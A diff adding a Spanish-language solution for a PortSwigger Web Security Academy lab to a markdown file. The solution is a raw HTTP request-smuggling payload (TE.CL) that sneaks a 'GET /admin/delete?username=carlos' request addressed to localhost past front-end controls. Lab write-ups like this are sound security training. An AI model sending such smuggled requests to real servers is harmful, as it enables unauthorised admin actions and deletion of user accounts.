@@ -562,6 +562,29 @@ Content-Length: 30
 foo
 ```
 
+### [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)
+
+#### Solución:
+
+Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener los 2 saltos de línea del final):
+
+```
+POST / HTTP/1.1
+Host: acf41fd21fb3668e801a6d9900c800f7.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+6C
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+
+```
+
 ---
 
 ## [OS command injection](https://portswigger.net/web-security/os-command-injection)
